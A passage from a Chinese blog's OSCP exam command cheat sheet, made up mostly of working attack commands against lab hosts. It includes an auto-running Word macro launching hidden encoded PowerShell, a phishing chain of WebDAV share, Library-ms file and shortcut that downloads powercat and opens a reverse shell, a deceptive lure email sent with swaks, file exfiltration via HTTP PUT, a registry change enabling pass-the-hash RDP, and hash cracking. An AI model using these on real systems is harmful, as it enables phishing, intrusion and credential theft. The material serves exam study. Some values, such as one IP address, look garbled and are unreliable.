10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>钓鱼fish</h2>
<p>doc宏</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">###</span>
</span></span><span class="line"><span class="cl"><span class="n">Sub</span> <span class="n">AutoOpen</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">  <span class="n">MyMacro</span>
</span></span><span class="line"><span class="cl"><span class="k">End</span> <span class="n">Sub</span>
</span></span><span class="line"><span class="cl"><span class="n">Sub</span> <span class="n">Document_Open</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">  <span class="n">MyMacro</span>
</span></span><span class="line"><span class="cl"><span class="k">End</span> <span class="n">Sub</span>
</span></span><span class="line"><span class="cl"><span class="n">Sub</span> <span class="n">MyMacro</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">  <span class="n">CreateObject</span><span class="p">(</span><span class="s2">&#34;Wscript.Shell&#34;</span><span class="p">).</span><span class="n">Run</span> <span class="s2">&#34;powershell&#34;</span>
</span></span><span class="line"><span class="cl"><span class="k">End</span> <span class="n">Sub</span>
</span></span><span class="line"><span class="cl"><span class="c">###</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">###参数 分割</span>
</span></span><span class="line"><span class="cl"><span class="n">str</span> <span class="p">=</span> <span class="s2">&#34;powershell.exe -nop -w hidden -e xxx&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="p">=</span> <span class="n">50</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="k">in</span> <span class="n">range</span><span class="p">(</span><span class="n">0</span><span class="p">,</span> <span class="n">len</span><span class="p">(</span><span class="n">str</span><span class="p">),</span> <span class="n">n</span><span class="p">)</span><span class="err">:</span>
</span></span><span class="line"><span class="cl">	<span class="n">print</span><span class="p">(</span><span class="s2">&#34;Str = Str + &#34;</span> <span class="p">+</span> <span class="s1">&#39;&#34;&#39;</span> <span class="p">+</span> <span class="n">str</span><span class="p">[</span><span class="n">i:i</span><span class="p">+</span><span class="n">n</span><span class="p">]</span> <span class="p">+</span> <span class="s1">&#39;&#34;&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>快捷方式</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">启webdav
</span></span><span class="line"><span class="cl">启powercat http
</span></span><span class="line"><span class="cl">启nc
</span></span><span class="line"><span class="cl">vi config.Library-ms
</span></span><span class="line"><span class="cl">制作install.lnk
</span></span><span class="line"><span class="cl">config作为附件发邮件
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## webdav</span>
</span></span><span class="line"><span class="cl">wsgidav --host<span class="o">=</span>0.0.0.0 --port<span class="o">=</span><span class="m">80</span> --auth<span class="o">=</span>anonymous --root   /root/Document/relia
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## 脚本内容 config.Library-ms</span>
</span></span><span class="line"><span class="cl">&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">&#34;1.0&#34;</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">&#34;UTF-8&#34;</span>?&gt;
</span></span><span class="line"><span class="cl">&lt;libraryDescription <span class="nv">xmlns</span><span class="o">=</span><span class="s2">&#34;http://schemas.microsoft.com/windows/2009/library&#34;</span>&gt;
</span></span><span class="line"><span class="cl">&lt;name&gt;@windows.storage.dll,-34582&lt;/name&gt;
</span></span><span class="line"><span class="cl">&lt;version&gt;6&lt;/version&gt;
</span></span><span class="line"><span class="cl">&lt;isLibraryPinned&gt;true&lt;/isLibraryPinned&gt;
</span></span><span class="line"><span class="cl">&lt;iconReference&gt;imageres.dll,-1003&lt;/iconReference&gt;
</span></span><span class="line"><span class="cl">&lt;templateInfo&gt;
</span></span><span class="line"><span class="cl">&lt;folderType&gt;<span class="o">{</span>7d49d726-3c21-4f05-99aa-fdc2c9474656<span class="o">}</span>&lt;/folderType&gt;
</span></span><span class="line"><span class="cl">&lt;/templateInfo&gt;
</span></span><span class="line"><span class="cl">&lt;searchConnectorDescriptionList&gt;
</span></span><span class="line"><span class="cl">&lt;searchConnectorDescription&gt;
</span></span><span class="line"><span class="cl">&lt;isDefaultSaveLocation&gt;true&lt;/isDefaultSaveLocation&gt;
</span></span><span class="line"><span class="cl">&lt;isSupported&gt;false&lt;/isSupported&gt;
</span></span><span class="line"><span class="cl">&lt;simpleLocation&gt;
</span></span><span class="line"><span class="cl">&lt;url&gt;http://192.168.45.20713&lt;/url&gt;   <span class="c1">###修改为kali</span>
</span></span><span class="line"><span class="cl">&lt;/simpleLocation&gt;
</span></span><span class="line"><span class="cl">&lt;/searchConnectorDescription&gt;
</span></span><span class="line"><span class="cl">&lt;/searchConnectorDescriptionList&gt;
</span></span><span class="line"><span class="cl">&lt;/libraryDescription&gt;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## 快捷方式</span>
</span></span><span class="line"><span class="cl">powershell.exe -c <span class="s2">&#34;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.45.173:1111/powercat.ps1&#39;); powercat -c 192.168.45.173 -p 1234 -e powershell&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## 发邮件 --server是受害mailserver地址</span>
</span></span><span class="line"><span class="cl">sudo swaks -t jim@relia.com  --from maildmz@relia.com --attach @config.Library-ms --server 192.168.210.189 --body @body.txt --header <span class="s2">&#34;Subject: Staging Script&#34;</span> --suppress-data -ap
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">## body.txt</span>
</span></span><span class="line"><span class="cl">Hey!
</span></span><span class="line"><span class="cl">I checked WEBSRV1 and discovered that the previously used staging script still exists in the Git logs. I<span class="err">&#39;</span>ll remove it <span class="k">for</span> security reasons.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">On an unrelated note, please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">damon
</span></span></code></pre></td></tr></table></div>
</div>
</div><h2 id="框架"><a href="#框架" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>框架</h2>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## wpscan</span>
</span></span><span class="line"><span class="cl">wpscan --url http://172.16.111.241 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
</span></span></code></pre></td></tr></table></div>
</div>
</div><h2 id="数据库"><a href="#数据库" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>数据库</h2>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">#mysql</span>
</span></span><span class="line"><span class="cl">	mysql -u root -p<span class="s1">&#39;root&#39;</span> -h 192.168.199.197   -P <span class="m">3306</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#postgres 密码加密方式：Atlassian hashcat：12001</span>
</span></span><span class="line"><span class="cl">	psql -h 192.168.237.143  -p <span class="m">1234</span> -U postgres
</span></span><span class="line"><span class="cl">		<span class="se">\l</span>              所有数据库
</span></span><span class="line"><span class="cl">		<span class="se">\c</span> confluence   连接到confluence数据库
</span></span><span class="line"><span class="cl">		<span class="se">\d</span>t             库里的表
</span></span><span class="line"><span class="cl">		<span class="k">select</span> * from cwd_user<span class="p">;</span>  搜索是cmd_user表
</span></span><span class="line"><span class="cl">	hashcat -m <span class="m">12001</span>  admin.hash  /usr/share/wordlists/fasttrack.txt
</span></span></code></pre></td></tr></table></div>
</div>
</div><h2 id="tips"><a href="#tips" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a>Tips</h2>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="c">## powershell传文件</span>
</span></span><span class="line"><span class="cl">	<span class="n">kali</span><span class="p">&gt;</span> <span class="n">wsgidav</span> <span class="p">-</span><span class="n">-host</span><span class="p">=</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span> <span class="p">-</span><span class="n">-port</span><span class="p">=</span><span class="n">80</span> <span class="p">-</span><span class="n">-auth</span><span class="p">=</span><span class="n">anonymous</span> <span class="p">-</span><span class="n">-root</span>   <span class="p">/</span><span class="n">root</span><span class="p">/</span><span class="n">Document</span><span class="p">/</span><span class="n">atp</span> 
</span></span><span class="line"><span class="cl">	<span class="n">ps</span><span class="p">&gt;</span> <span class="nb">Invoke-RestMethod</span> <span class="n">-Uri</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">45</span><span class="p">.</span><span class="n">168</span><span class="p">/</span><span class="n">Database1</span><span class="p">.</span><span class="n">kdbx244</span><span class="p">/</span><span class="n">bloodhound</span><span class="p">.</span><span class="n">zip</span> <span class="n">-Method</span> <span class="n">PUT</span> <span class="n">-InFile</span> <span class="p">.\</span><span class="n">Database</span><span class="p">.</span><span class="n">kdbxmedtech_20231121055909_BloodHound</span><span class="p">.</span><span class="n">zip</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">## wget 目录</span>
</span></span><span class="line"><span class="cl">	<span class="nb">wget </span><span class="n">-r</span> <span class="n">-np</span> <span class="n">-nH</span> <span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">237</span><span class="p">.</span><span class="n">144</span><span class="p">/.</span><span class="n">git</span><span class="p">/</span>
</span></span><span class="line"><span class="cl"><span class="c">## git  </span>
</span></span><span class="line"><span class="cl">	<span class="n">git</span> <span class="n">status</span>
</span></span><span class="line"><span class="cl">	<span class="n">git</span> <span class="n">log</span> 
</span></span><span class="line"><span class="cl">	<span class="n">git</span> <span class="n">show</span> <span class="n">xxx</span>
</span></span><span class="line"><span class="cl"><span class="c">## UAC</span>
</span></span><span class="line"><span class="cl">	<span class="n">1</span><span class="p">.</span> <span class="n">加入域的机器可以无视</span>
</span></span><span class="line"><span class="cl">	<span class="n">2</span><span class="p">.</span> <span class="n">非加入域的机器</span><span class="err">：</span><span class="n">需要有管理员权限</span>
</span></span><span class="line"><span class="cl">	<span class="n">3</span><span class="p">.</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c">## hash连接rdp问题</span>
</span></span><span class="line"><span class="cl">	<span class="n">REG</span> <span class="n">ADD</span> <span class="s2">&#34;HKLM\System\CurrentControlSet\Control\Lsa&#34;</span> <span class="p">/</span><span class="n">v</span> <span class="n">DisableRestrictedAdmin</span> <span class="p">/</span><span class="n">t</span> <span class="n">REG_DWORD</span> <span class="p">/</span><span class="n">d</span> <span class="n">00000000</span> <span class="p">/</span><span class="n">f</span>
</span></span><span class="line"><span class="cl"><span class="c">## 域中双跳问题解决</span>
</span></span><span class="line"><span class="cl">	<span class="p">-----------</span> 
</span></span><span class="line"><span class="cl">	<span class="n">1</span><span class="p">.</span> <span class="c">## evil-winrm中使用</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 创建cred</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$SecPassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;!qazXSW@&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
</span></span><span class="line"><span class="cl">		<span class="nv">$Cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;INLANEFREIGHT\backupadm&#39;</span><span class="p">,</span> <span class="nv">$SecPassword</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 使用</span>
</span></span><span class="line"><span class="cl">		<span class="nb">get-domainuser</span> <span class="n">-spn</span> <span class="n">-credential</span> <span class="nv">$Cred</span>
</span></span><span class="line"><span class="cl">		
</span></span><span class="line"><span class="cl">	<span class="p">-----------</span>
</span></span><span class="line"><span class="cl">	<span class="n">2</span><span class="p">.</span> <span class="c">## 有rdp时使用 </span>
</span></span><span class="line"><span class="cl">	    <span class="c">### 用winrm连接目标</span>
</span></span><span class="line"><span class="cl">		<span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="nb">ACADEMY-AEN</span><span class="n">-DEV01</span><span class="p">.</span><span class="n">INLANEFREIGHT</span><span class="p">.</span><span class="n">LOCAL</span> <span class="n">-Credential</span> <span class="n">inlanefreight</span><span class="p">\</span><span class="n">backupadm</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 注册新配置</span>
</span></span><span class="line"><span class="cl">		<span class="nb">Register-PSSessionConfiguration</span> <span class="n">-Name</span> <span class="n">backupadmsess</span> <span class="n">-RunAsCredential</span> <span class="n">inlanefreight</span><span class="p">\</span><span class="n">backupadm</span>
</span></span><span class="line"><span class="cl">		<span class="nb">Restart-Service</span> <span class="n">WinRM</span>
</span></span><span class="line"><span class="cl">		<span class="c">### 重连</span>
</span></span><span class="line"><span class="cl">		<span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="n">DEV01</span> <span class="n">-Credential</span> <span class="n">INLANEFREIGHT</span><span class="p">\</span><span class="n">backupadm</span> <span class="n">-ConfigurationName</span>  <span class="n">backupadmsess</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div>
            </div>

            
    
    
        <ul class="post-copyright">
            <li class="copyright-item author"><span class="copyright-item-text">作者</span>：<a href="https://klearcc.github.io/" class="p-author h-card" target="_blank" rel="noopener">Klear</a></li>
            
                
                
                
                
                <li class="copyright-item link"><span class="copyright-item-text">链接</span>：<a href="/post/%E7%BB%84%E4%BB%B6%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/" target="_blank" rel="noopener">https://klearcc.github.io/post/组件攻击汇总/</a></li>
            
            <li class="copyright-item license"><span class="copyright-item-text">许可</span>：<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></li>
            
        </ul>
    



        </article>

        

        
    <div class="updated-badge-container">
        <span title="Updated @ 2024-01-16 16:52:02 CST" style="cursor:help">

<svg xmlns="http://www.w3.org/2000/svg" width="130" height="20" class="updated-badge"><linearGradient id="b" x2="0" y2="100%"><stop offset="0" stop-color="#bbb" stop-opacity=".1"/><stop offset="1" stop-opacity=".1"/></linearGradient><clipPath id="a"><rect width="130" height="20" rx="3" fill="#fff"/></clipPath><g clip-path="url(#a)"><path class="updated-badge-left" d="M0 0h55v20H0z"/><path class="updated-badge-right" d="M55 0h75v20H55z"/><path fill="url(#b)" d="M0 0h130v20H0z"/></g><g fill="#fff" text-anchor="middle" font-size="110"><text x="285" y="150" fill="#010101" fill-opacity=".3" textLength="450" transform="scale(.1)">updated</text><text x="285" y="140" textLength="450" transform="scale(.1)">updated</text><text x="915" y="150" fill="#010101" fill-opacity=".3" textLength="650" transform="scale(.1)">2024-01-16</text><text x="915" y="140" textLength="650" transform="scale(.1)">2024-01-16</text></g></svg>
        </span></div>



        


        <div class="post-share">

        

        <div class="share-items">

            
                <div class="share-item twitter">
                    
                    <a href="https://twitter.com/share?url=https://klearcc.github.io/post/%E7%BB%84%E4%BB%B6%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&amp;text=%e4%bb%85%e9%92%88%e5%af%b9OSCP%e8%80%83%e8%af%95%e7%9a%84%e5%91%bd%e4%bb%a4%e7%ac%94%e8%ae%b0&amp;hashtags=OSCP,&amp;via=En0langg" title="分享到「Twitter」" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon twitter-icon"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg></a>
                </div>
            

            
                <div class="share-item facebook">
                    
                    <a href="https://www.facebook.com/sharer/sharer.php?u=https://klearcc.github.io/post/%E7%BB%84%E4%BB%B6%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&amp;hashtag=%23OSCP" title="分享到「Facebook」" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon facebook-icon"><path d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg></a>
                </div>
            

            
                <div class="share-item linkedin">
                    
                    <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://klearcc.github.io/post/%E7%BB%84%E4%BB%B6%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&amp;title=%e4%bb%85%e9%92%88%e5%af%b9OSCP%e8%80%83%e8%af%95%e7%9a%84%e5%91%bd%e4%bb%a4%e7%ac%94%e8%ae%b0&amp;summary=%e6%ad%a4%e5%91%bd%e4%bb%a4%e7%ac%94%e8%ae%b0%e4%bb%85%e9%92%88%e5%af%b9OSCP%e8%80%83%e8%af%95%ef%bc%8c%e4%b8%8d%e5%8c%85%e6%8b%ac%e8%80%83%e8%af%95%e2%80%a6%e2%80%a6&amp;source=Klear%c2%b7blog" title="分享到「LinkedIn」" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon linkedin-icon"><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg></a>
                </div>
            

            
                <div class="share-item telegram">
                    
                    <a href="https://t.me/share/url?url=https://klearcc.github.io/post/%E7%BB%84%E4%BB%B6%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/&amp;text=%e4%bb%85%e9%92%88%e5%af%b9OSCP%e8%80%83%e8%af%95%e7%9a%84%e5%91%bd%e4%bb%a4%e7%ac%94%e8%ae%b0" title="分享到「Telegram」" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" class="icon telegram-icon"><path d="M248 8C111 8 0 119 0 256s111 248 248 248 248-111 248-248S385 8 248 8zm121.8 169.9l-40.7 191.8c-3 13.6-11.1 16.9-22.4 10.5l-62-45.7-29.9 28.8c-3.3 3.3-6.1 6.1-12.5 6.1l4.4-63.1 114.9-103.8c5-4.4-1.1-6.9-7.7-2.5l-142 89.4-61.2-19.1c-13.3-4.2-13.6-13.3 2.8-19.7l239.1-92.2c11.1-4 20.8 2.7 17.2 19.5z"/></svg></a>
                </div>
            

            
                <div class="share-item weibo">
                    
